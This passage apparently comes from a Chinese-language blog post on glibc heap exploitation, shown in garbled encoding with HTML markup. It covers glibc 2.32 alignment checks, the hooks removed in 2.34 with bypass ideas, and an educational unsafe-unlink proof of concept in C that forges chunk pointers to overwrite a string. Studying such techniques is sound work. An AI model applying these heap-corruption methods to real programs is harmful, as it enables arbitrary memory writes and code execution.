title="å†…å­˜å¯¹é½æ£€æµ‹"></a>å†…å­˜å¯¹é½æ£€æµ‹</h4><p>æ­¤å¤–ï¼Œåœ¨glibc-2.32ç‰ˆæœ¬ä¸­è¿˜å¼•å…¥äº†å¯¹tcacheå’Œfastbinsä¸­ç”³è¯·åŠé‡Šæ”¾å†…å­˜åœ°å€çš„å¯¹é½æ£€æµ‹ï¼Œä»¥tcache_get()ä¸ºä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *<br><br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br><br>&#123;<br><br>tcache_entry *e = tcache-&gt;entries[tc_idx];<br><br><span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br><br>malloc_printerr (â€œ<span class="hljs-built_in">malloc</span>(): unaligned tcache chunk detectedâ€);<br><br>tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);<br><br>â€“(tcache-&gt;counts[tc_idx]);<br><br>e-&gt;key = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>aligned_OK()å®šä¹‰ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT â€“ 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \</span><br><span class="hljs-meta">? __alignof__ (long double) : 2 * SIZE_SZ)</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å†…å­˜åœ°å€éœ€è¦ä»¥0x10å­—èŠ‚å¯¹é½ã€‚</p><h3 id="libc-2-34"><a href="#libc-2-34" class="headerlink" title="libc-2.34"></a>libc-2.34</h3><p>glibc-2.34 çš„åˆ°æ¥ç»™äºˆäº†hookåŠ«æŒæ²‰é‡çš„ä¸€å‡»ï¼Œç§»é™¤äº†ä»¥ä¸‹å‡ ä¸ªhookç¬¦å·ï¼š</p><blockquote><p>__free_hook</p><p>__malloc_hook</p><p>__realloc_hook</p><p>__memalign_hook</p><p>__after_morecore_hook</p></blockquote><h4 id="ç»•è¿‡æ€è·¯"><a href="#ç»•è¿‡æ€è·¯" class="headerlink" title="ç»•è¿‡æ€è·¯"></a>ç»•è¿‡æ€è·¯</h4><ol><li>åˆ©ç”¨IO_vtable</li><li>åˆ©ç”¨exit_hook</li><li>åŠ«æŒè¿”å›åœ°å€è¿›è¡ŒROP</li></ol><h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe unlink"></a>unsafe unlink</h2><p>unsafe-unlinkåˆ©ç”¨chunkfreeæ—¶çš„åˆå¹¶æœºåˆ¶ï¼Œå®ç°äº†åœ°å€çš„ä»»æ„è¯»å†™</p><blockquote><p>ä½¿ç”¨æ¡ä»¶ï¼š</p><ul><li>èƒ½å¤Ÿåˆ©ç”¨æº¢å‡ºæˆ–å…¶ä»–æ¼æ´ï¼Œå°†æŸchunkçš„sizeåŸŸçš„æœ€ä½16è¿›åˆ¶ä½ä¿®æ”¹ä¸º0ï¼Œä¾‹: 0x91 â€“&gt; 0x90</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*è¿™æ˜¯ä¸€æ®µunsafe-unlinkçš„ç¤ºä¾‹ä»£ç ï¼Œæˆ‘ä»¬åœ¨æœ€åæˆåŠŸåˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œ</span><br><span class="hljs-comment">å®ç°äº†å¯¹éå †ä¸Šåœ°å€victimstringçš„å†…å®¹æ›´æ”¹*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">uint64_t</span> * chunk0_ptr;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    chunk0_ptr = (<span class="hljs-type">uint64_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);       <span class="hljs-comment">//chunk0</span><br>    <span class="hljs-type">uint64_t</span> *chunk1_ptr = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);        <span class="hljs-comment">//chunk1</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;chunk0_ptr: %p -&gt; %p\n&quot;</span>,&amp;chunk0_ptr, chunk0_ptr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;victim chunk: %p\n\n&quot;</span>,chunk1_ptr);<br><br>    <span class="hljs-comment">/*pass the check:   (chunksize(p) != prev_size(next_chunk(P)) == False)</span><br><span class="hljs-comment">                        chunk0_ptr[1] = 0x0;// or 0x8, 0x80*/</span><br><br>    <span class="hljs-comment">//pass the check:   (p-&gt;fd-&gt;bk != p || p-&gt;bk-&gt;fd != p) == False</span><br><br>    chunk0_ptr [<span class="hljs-number">2</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr - <span class="hljs-number">0x18</span>;<br>    chunk0_ptr [<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr - <span class="hljs-number">0x10</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fake fd: %p = &amp;chunk0_ptr - 0x18&quot;</span>, (<span class="hljs-type">void</span>*)chunk0_ptr[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fake bk: %p = &amp;chunk0_ptr - 0x10&quot;</span>, (<span class="hljs-type">void</span>*)chunk0_ptr[<span class="hljs-number">3</span>]);<br>    <br>    <span class="hljs-type">uint64_t</span> *chunk1_hdr = (<span class="hljs-type">void</span>*) chunk1_ptr - <span class="hljs-number">0x10</span>;<br>    chunk1_hdr[<span class="hljs-number">0</span>] = <span class="hljs-number">0x80</span>;<br>    chunk1_hdr[<span class="hljs-number">1</span>] &amp;= ~<span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">/*  int *t[10], i;                  //tcache</span><br><span class="hljs-comment">        for(i=0; i&lt;7; i++)&#123;</span><br><span class="hljs-comment">            t[i] = malloc(0x80);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        for(i=0;i&lt;7;i++)&#123;</span><br><span class="hljs-comment">            free(t[i]);</span><br><span class="hljs-comment">        &#125;;  */</span><br><br>    <span class="hljs-built_in">free</span>(chunk1_ptr);               <span class="hljs-comment">//unlink</span><br><br>    <span class="hljs-type">char</span> victim_string[<span class="hljs-number">8</span>] = <span class="hljs-string">&quot;AAAAAAA&quot;</span>;<br>    chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) victim_string;   <span class="hljs-comment">//overwrite itself</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;old value: %s\n&quot;</span>, victim_string);<br><br>    chunk0_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">0x42424242424242</span>LL;     <span class="hljs-comment">//over wirting victim_string</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;new Value: %s\n&quot;</span>, victim_string);<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ç¤ºä¾‹å›¾"><a href="#ç¤ºä¾‹å›¾" class="headerlink" title="ç¤ºä¾‹å›¾"></a>ç¤ºä¾‹å›¾</h4><p><img src="/img/article/6.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
